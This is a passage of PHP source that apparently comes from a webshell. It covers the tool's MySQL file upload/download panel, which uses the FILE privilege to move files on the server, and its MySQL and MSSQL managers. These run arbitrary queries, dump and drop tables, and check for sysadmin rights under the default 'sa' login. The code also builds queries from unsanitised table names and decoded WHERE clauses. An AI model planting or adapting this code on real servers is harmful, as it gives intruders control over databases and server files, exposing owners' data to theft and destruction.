<?php
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
	makehide('action','sqlfile');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBName:');
	makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
	p('</p>');
	formfoot();
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
	p('<h2>Upload file</h2>');
	p('<p><b>This operation the DB user must has FILE privilege</b></p>');
	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
	p('<h2>Download file</h2>');
	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
	makehide('dbname');
	makehide('charset');
	makehide('doing');
	makehide('action','sqlfile');
	p('</form>');
}

elseif ($action == 'mysqladmin') {
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
	if(isset($dbhost)){
		$dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
	}
	if(isset($dbuser)) {
		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
	}
	if(isset($dbpass)) {
		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
	}
	if(isset($dbport)) {
		$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
	}
	if(isset($dbname)) {
		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
	}
	if(isset($charset)) {
		$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
	}

	if ($doing == 'backupmysql' && $saveasfile) {
		if (!$table) {
			m('Please choose the table');
		} else {
			mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			$fp = @fopen($path,'w');
			if ($fp) {
				foreach($table as $k => $v) {
					if ($v) {
						sqldumptable($v, $fp);
					}
				}
				fclose($fp);				
				$fileurl = str_replace(SA_ROOT,'',$path);
				m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
				mysql_close();
			} else {
				m('Backup failed');
			}
		}
	}
	if ($insert && $insertsql) {
		$keystr = $valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			if ($val) {
				$keystr .= $tmp.$key;
				$valstr .= $tmp."'".addslashes($val)."'";
				$tmp = ',';
			}
		}
		if ($keystr && $valstr) {
			mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
		}
	}
	if ($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			$valstr .= $tmp.$key."='".addslashes($val)."'";
			$tmp = ',';
		}
		if ($valstr) {
			$where = base64_decode($base64);
			mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
		}
	}
	if ($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM $tablename WHERE $where";
		mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
	}

	if ($tablename && $doing == 'drop') {
		mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		if (q("DROP TABLE $tablename")) {
			m('Drop table of success');
			$tablename = '';
		} else {
			m(mysql_error());
		}
	}

	formhead(array('title'=>'MYSQL Manager'));
	makehide('action','mysqladmin');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();

	//........
	formhead(array('name'=>'recordlist'));
	makehide('doing');
	makehide('action','mysqladmin');
	makehide('base64');
	makehide('tablename');
	p($dbform);
	formfoot();

	//..........
	formhead(array('name'=>'setdbname'));
	makehide('action','mysqladmin');
	p($dbform);
	if (!$dbname) {
		makehide('dbname');
	}
	formfoot();

	//......
	formhead(array('name'=>'settable'));
	makehide('action','mysqladmin');
	p($dbform);
	makehide('tablename');
	makehide('page',$page);
	makehide('doing');
	formfoot();

	$cachetables = array();	
	$pagenum = 30;
	$page = intval($page);
	if($page) {
		$start_limit = ($page - 1) * $pagenum;
	} else {
		$start_limit = 0;
		$page = 1;
	}
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		//..............
		$mysqlver = mysql_get_server_info();
		p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
		$highver = $mysqlver > '4.1' ? 1 : 0;

		//..........
		$query = q("SHOW DATABASES");
		$dbs = array();
		$dbs[] = '-- Select a database --';
		while($db = mysql_fetch_array($query)) {
			$dbs[$db['Database']] = $db['Database'];
		}
		makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
		$tabledb = array();
		if ($dbname) {
			p('<p>');
			p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
			if ($tablename) {
				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
			}
			p('</p>');
			mysql_select_db($dbname);

			$getnumsql = '';
			$runquery = 0;
			if ($sql_query) {
				$runquery = 1;
			}
			$allowedit = 0;
			if ($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename";
				$getnumsql = $sql_query;
				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
				$allowedit = 1;
			}
			p('<form action="'.$self.'" method="POST">');
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
			makehide('tablename', $tablename);
			makehide('action','mysqladmin');
			p($dbform);
			p('</form>');
			if ($tablename || ($runquery && $sql_query)) {
				if ($doing == 'structure') {
					$result = q("SHOW FULL COLUMNS FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('<h3>Structure</h3>');
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td>Field</td>');
					p('<td>Type</td>');
					p('<td>Collation</td>');
					p('<td>Null</td>');
					p('<td>Key</td>');
					p('<td>Default</td>');
					p('<td>Extra</td>');
					p('<td>Privileges</td>');
					p('<td>Comment</td>');
					p('</tr>');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						p('<td>'.$row['Field'].'</td>');
						p('<td>'.$row['Type'].'</td>');
						p('<td>'.$row['Collation'].'&nbsp;</td>');
						p('<td>'.$row['Null'].'&nbsp;</td>');
						p('<td>'.$row['Key'].'&nbsp;</td>');
						p('<td>'.$row['Default'].'&nbsp;</td>');
						p('<td>'.$row['Extra'].'&nbsp;</td>');
						p('<td>'.$row['Privileges'].'&nbsp;</td>');
						p('<td>'.$row['Comment'].'&nbsp;</td>');
						p('</tr>');
					}
					tbfoot();
					$result = q("SHOW INDEX FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('<h3>Indexes</h3>');
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td>Keyname</td>');
					p('<td>Type</td>');
					p('<td>Unique</td>');
					p('<td>Packed</td>');
					p('<td>Seq_in_index</td>');
					p('<td>Field</td>');
					p('<td>Cardinality</td>');
					p('<td>Collation</td>');
					p('<td>Null</td>');
					p('<td>Comment</td>');
					p('</tr>');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						p('<td>'.$row['Key_name'].'</td>');
						p('<td>'.$row['Index_type'].'</td>');
						p('<td>'.($row['Non_unique'] ? 'No' : 'Yes').'&nbsp;</td>');
						p('<td>'.($row['Packed'] === null ? 'No' : $row['Packed']).'&nbsp;</td>');
						p('<td>'.$row['Seq_in_index'].'</td>');
						p('<td>'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&nbsp;</td>');
						p('<td>'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&nbsp;</td>');
						p('<td>'.$row['Collation'].'&nbsp;</td>');
						p('<td>'.$row['Null'].'&nbsp;</td>');
						p('<td>'.$row['Comment'].'&nbsp;</td>');
						p('</tr>');
					}
					tbfoot();
				} elseif ($doing == 'insert' || $doing == 'edit') {
					$result = q('SHOW COLUMNS FROM '.$tablename);
					while ($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					$rs = array();
					if ($doing == 'insert') {
						p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
					} else {
						p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
						$where = base64_decode($base64);
						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
						$rs = mysql_fetch_array($result);
					}
					p('<form method="post" action="'.$self.'">');
					p($dbform);
					makehide('action','mysqladmin');
					makehide('tablename',$tablename);
					p('<table border="0" cellpadding="3" cellspacing="0">');
					foreach ($rowdb as $row) {
						if ($rs[$row['Field']]) {
							$value = htmlspecialchars($rs[$row['Field']]);
						} else {
							$value = '';
						}
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
							p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td>'.$value.'&nbsp;</td></tr>');
						} else {							
							p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
						}
					}
					if ($doing == 'insert') {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
					} else {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
						makehide('base64', $base64);
					}
					p('</table></form>');
				} else {
					$querys = @explode(';',$sql_query);
					foreach($querys as $num=>$query) {
						if ($query) {
							p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
							switch(qy($query))
							{
								case 0:
									p('<h2>Error : '.mysql_error().'</h2>');
									break;	
								case 1:
									if (strtolower(substr($query,0,13)) == 'select * from') {
										$allowedit = 1;
									}
									if ($getnumsql) {
										$tatol = mysql_num_rows(q($getnumsql));
										$multipage = multi($tatol, $pagenum, $page, $tablename);
									}
									if (!$tablename) {
										$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
										$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
										preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
										$tablename = $matches[1][0];
									}

									/*********************/
									$getfield = q("SHOW COLUMNS FROM $tablename");
									$rowdb = array();
									$keyfied = ''; //........
									while($row = @mysql_fetch_assoc($getfield)) {
										$rowdb[$row['Field']]['Key'] = $row['Key'];
										$rowdb[$row['Field']]['Extra'] = $row['Extra'];
										if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {
											$keyfied = $row['Field'];
										}
									}
									/*********************/								
									//..........................
									if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
										$query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
									}

									$result = q($query);

									p($multipage);
									p('<table border="0" cellpadding="3" cellspacing="0">');
									p('<tr class="head">');
									if ($allowedit) p('<td>Action</td>');
									$fieldnum = @mysql_num_fields($result);
									for($i=0;$i<$fieldnum;$i++){
										$name = @mysql_field_name($result, $i);
										$type = @mysql_field_type($result, $i);
										$len = @mysql_field_len($result, $i);
										p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
									}
									p('</tr>');
									
									while($mn = @mysql_fetch_assoc($result)){
										$thisbg = bg();
										p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
										$where = $tmp = $b1 = '';
										//..............
										foreach($mn as $key=>$inside){
											if ($inside) {
												//..........................................................................
												if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
													$where = $key."='".addslashes($inside)."'";
													break;
												}
												$where .= $tmp.$key."='".addslashes($inside)."'";
												$tmp = ' AND ';
											}
										}
										//..........
										foreach($mn as $key=>$inside){
											$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
										}
										$where = base64_encode($where);

										if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');

										p($b1);
										p('</tr>');
										unset($b1);
									}
									p('<tr class="head">');
									if ($allowedit) p('<td>Action</td>');
									$fieldnum = @mysql_num_fields($result);
									for($i=0;$i<$fieldnum;$i++){
										$name = @mysql_field_name($result, $i);
										$type = @mysql_field_type($result, $i);
										$len = @mysql_field_len($result, $i);
										p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
									}
									p('</tr>');
									tbfoot();
									p($multipage);
									break;
								case 2:
									$ar = mysql_affected_rows();
									p('<h2>affected rows : <b>'.$ar.'</b></h2>');
									break;
							}
						}
					}
				}
			} else {
				$query = q("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = mysql_fetch_array($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table['Data_length'] = sizecount($table['Data_length']);
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				p('<table border="0" cellpadding="0" cellspacing="0">');
				p('<form action="'.$self.'" method="POST">');
				makehide('action','mysqladmin');
				p($dbform);
				p('<tr class="head">');
				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
				p('<td>Name</td>');
				p('<td>Rows</td>');
				p('<td>Data_length</td>');
				p('<td>Create_time</td>');
				p('<td>Update_time</td>');
				if ($highver) {
					p('<td>Engine</td>');
					p('<td>Collation</td>');
				}
				p('<td>Operate</td>');
				p('</tr>');
				foreach ($tabledb as $key => $table) {
					$thisbg = bg();
					p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
					p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
					p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
					p('<td>'.$table['Rows'].'</td>');
					p('<td>'.$table['Data_length'].'</td>');
					p('<td>'.$table['Create_time'].'&nbsp;</td>');
					p('<td>'.$table['Update_time'].'&nbsp;</td>');
					if ($highver) {
						p('<td>'.$table['Engine'].'</td>');
						p('<td>'.$table['Collation'].'</td>');
					}
					p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a></td>');
					p('</tr>');
				}
				p('<tr class="head">');
				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
				p('<td>Name</td>');
				p('<td>Rows</td>');
				p('<td>Data_length</td>');
				p('<td>Create_time</td>');
				p('<td>Update_time</td>');
				if ($highver) {
					p('<td>Engine</td>');
					p('<td>Collation</td>');
				}
				p('<td>Operate</td>');
				p('</tr>');
				p('<tr class='.bg().'>');
				p('<td>&nbsp;</td>');
				p('<td>Total tables: '.$table_num.'</td>');
				p('<td>'.$table_rows.'</td>');
				p('<td>'.$data_size.'</td>');
				p('<td colspan="'.($highver ? 5 : 3).'">&nbsp;</td>');
				p('</tr>');

				p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
				makehide('doing','backupmysql');
				formfoot();
				p("</table>");
				fr($query);
			}
		}
	}
	tbfoot();
	@mysql_close();
}//end mysql


elseif ($action == 'mssqladmin') {
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'sa';
	!$dbname && $dbname = 'master';
	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
	if(isset($dbhost)){
		$dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
	}
	if(isset($dbuser)) {
		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
	}
	if(isset($dbpass)) {
		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
	}
	if(isset($dbname)) {
		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
	}
	if ($insert && $insertsql) {
		$keystr = $valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			if ($val) {
				$keystr .= $tmp.$key;
				$valstr .= $tmp."'".addslashes($val)."'";
				$tmp = ',';
			}
		}
		if ($keystr && $valstr) {
			msdbconn($dbhost,$dbuser,$dbpass,$dbname);
			m(msq("INSERT INTO [$tablename] ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : msmsg());
		}
	}
	if ($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			$valstr .= $tmp.$key."='".addslashes($val)."'";
			$tmp = ',';
		}
		if ($valstr) {
			$where = base64_decode($base64);
			msdbconn($dbhost,$dbuser,$dbpass,$dbname);
			m(msq("UPDATE [$tablename] SET $valstr WHERE $where") ? 'Record updating' : msmsg());
		}
	}
	if ($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM [$tablename] WHERE $where";
		msdbconn($dbhost,$dbuser,$dbpass,$dbname);
		m(msq("DELETE FROM [$tablename] WHERE $where") ? 'Deletion record of success' : msmsg());
	}

	if ($tablename && $doing == 'drop') {
		msdbconn($dbhost,$dbuser,$dbpass,$dbname);
		if (msq("DROP TABLE [$tablename]")) {
			m('Drop table of success');
			$tablename = '';
		} else {
			m(msmsg());
		}
	}

	formhead(array('title'=>'MSSQL Manager'));
	makehide('action','mssqladmin');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();

	//........
	formhead(array('name'=>'recordlist'));
	makehide('doing');
	makehide('action','mssqladmin');
	makehide('base64');
	makehide('tablename');
	p($dbform);
	formfoot();

	//..........
	formhead(array('name'=>'mssqlinfo'));
	makehide('action','mssqladmin');
	makehide('doing','mssqlinfo');
	makehide('dbname');
	p($dbform);
	formfoot();

	//..........
	formhead(array('name'=>'setdbname'));
	makehide('action','mssqladmin');
	p($dbform);
	if (!$dbname) {
		makehide('dbname');
	}
	formfoot();

	//......
	formhead(array('name'=>'settable'));
	makehide('action','mssqladmin');
	p($dbform);
	makehide('tablename');
	makehide('page',$page);
	makehide('doing');
	formfoot();

	$cachetables = array();	
	$pagenum = 30;
	$page = intval($page);
	if($page) {
		$start_limit = ($page - 1) * $pagenum;
	} else {
		$start_limit = 0;
		$page = 1;
	}

	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		!$dbname && $dbname = 'master';
		msdbconn($dbhost, $dbuser, $dbpass, $dbname);
		////////////////////////////////////////////////////////////////
		$query = msq('select @@version');
		$msinfo = mssql_fetch_array($query);
		echo '<p>'.$msinfo[0].'</p>';
		
		$query = msq("SELECT IS_SRVROLEMEMBER('sysadmin')");
		$msinfo = mssql_fetch_array($query);
		$issa = 0;
		if ($msinfo[0]) {
			$issa = 1;
			echo '<h3>Your are sysadmin!</h3>';
		}
		//..........
		$query = msq("SELECT name FROM master.dbo.sysdatabases WHERE has_dbaccess(name) = 1 ORDER BY name");
		$dbs = array();
		$dbs[] = '-- Select a database --';
		while($db = mssql_fetch_array($query)) {
			$dbs[$db['name']] = $db['name'];
		}
		makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
		$tabledb = array();
		if ($dbname) {
			p('<p>');
			p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a> [ <a href="javascript:mssqlinfo(\''.$dbname.'\');">information</a> ]');
			if ($tablename) {
				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
			}
			p('</p>');
			if ($doing == 'mssqlinfo') {
				$result = msq("SELECT t1.owner, t1.crdate, t1.size, t2.DBBupDate, t3.DifBupDate, t4.JournalBupDate FROM (SELECT d.name, suser_sname(d.sid) AS owner, d.crdate, (SELECT STR(SUM(CONVERT(DEC(15), f.size)) * (SELECT v.low FROM master.dbo.spt_values v WHERE v.type = 'E' AND v.number = 1) / 1048576, 10, 2) + 'MB' FROM [$dbname].dbo.sysfiles f) AS size FROM master.dbo.sysdatabases d WHERE d.name = '[$dbname]') AS t1 LEFT JOIN (SELECT '[$dbname]' AS name, MAX(backup_finish_date) AS DBBupDate FROM msdb.dbo.backupset WHERE type = 'D' AND database_name = '[$dbname]') AS t2 ON t1.name = t2.name LEFT JOIN (SELECT '[$dbname]' AS name, MAX(backup_finish_date) AS DifBupDate FROM msdb.dbo.backupset WHERE type = 'I' AND database_name = '[$dbname]') AS t3 ON t1.name = t3.name LEFT JOIN (SELECT '[$dbname]' AS name, MAX(backup_finish_date) AS JournalBupDate FROM msdb.dbo.backupset WHERE type = 'L' AND database_name = '[$dbname]') AS t4 ON t1.name = t4.name");
				$info = mssql_fetch_assoc($result);

				p('<table border="0" cellpadding="3" cellspacing="0">');
				p('<tr class="head">');
				p('<td colspan="2">'.$dbname.' Information</td>');
				p('</tr>');

				p('<tr class="alt1" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt1\';">');
				p('<td>Owner</td><td>'.$info['owner'].'</td>');
				p('</tr>');
				p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';">');
				p('<td>Create date</td><td>'.$info['crdate'].'</td>');
				p('</tr>');
				p('<tr class="alt1" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt1\';">');
				p('<td>Size</td><td>'.$info['size'].'</td>');
				p('</tr>');
				p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';">');
				p('<td>Last backup</td><td>'.$info['DBBupDate'].'&nbsp;</td>');
				p('</tr>');
				p('<tr class="alt1" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt1\';">');
				p('<td>Last differential backup</td><td>'.$info['DifBupDate'].'&nbsp;</td>');
				p('</tr>');
				p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';">');
				p('<td>Last log backup</td><td>'.$info['JournalBupDate'].'&nbsp;</td>');
				p('</tr>');
				tbfoot();
				p('<br /><br />');
				
				$result = msq("EXEC sp_helpfile");
				$rowdb = array();
				while ($row = mssql_fetch_assoc($result)) {
					$rowdb[] = $row;
				}
				foreach($rowdb as $row){
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td colspan="2">'.$row['name'].'</td>');
					p('</tr>');
					p('<tr class="alt1" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt1\';">');
					p('<td>Filename</td><td>'.$row['filename'].'&nbsp;</td>');
					p('</tr>');
					p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';">');
					p('<td>Filegroup</td><td>'.$row['filegroup'].'&nbsp;</td>');
					p('</tr>');
					p('<tr class="alt1" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt1\';">');
					p('<td>Size</td><td>'.$row['size'].'&nbsp;</td>');
					p('</tr>');
					p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';">');
					p('<td>Maxsize</td><td>'.$row['maxsize'].'&nbsp;</td>');
					p('</tr>');
					p('<tr class="alt1" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt1\';">');
					p('<td>Growth</td><td>'.$row['growth'].'&nbsp;</td>');
					p('</tr>');
					p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';">');
					p('<td>Usage</td><td>'.$row['usage'].'&nbsp;</td>');
					p('</tr>');
					tbfoot();
					p('<br /><br />');
				}
			} else {
				$getnumsql = '';
				$runquery = 0;
				if ($sql_query) {
					$runquery = 1;
				}
				$allowedit = 0;
				if ($tablename && !$sql_query) {
					$sql_query = "SELECT * FROM [$tablename]";
					$getnumsql = "SELECT count(*) FROM [$tablename]";
					$allowedit = 1;
				}

				p('<form action="'.$self.'" method="POST">');
				p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
				makehide('tablename', $tablename);
				makehide('action','mssqladmin');
				p($dbform);
				p('</form>');
				if ($tablename || ($runquery && $sql_query)) {
					if ($doing == 'structure') {
						$result = msq("select b.name,c.name as type,c.xtype,b.length,b.isnullable,b.colstat,case when b.autoval is null then 0 else 1 end,b.colid,a.id,d.text from sysobjects a join syscolumns b on a.id = b.id join systypes c on b.xtype = c.xtype and c.usertype <> 18 left join syscomments d on d.id = b.cdefault where a.id = OBJECT_ID('[$tablename]') order by b.colid");
						$rowdb = array();
						while($row = mssql_fetch_array($result)) {
							$rowdb[] = $row;
						}
						p('<table border="0" cellpadding="3" cellspacing="0">');
						p('<tr class="head">');
						p('<td>Field</td>');
						p('<td>Type[xtype]</td>');
						p('<td>Length</td>');
						p('<td>Isnullable</td>');
						p('<td>Key</td>');
						p('<td>Default</td>');
						p('<td>Extra</td>');
						p('</tr>');
						foreach ($rowdb as $row) {
							$thisbg = bg();
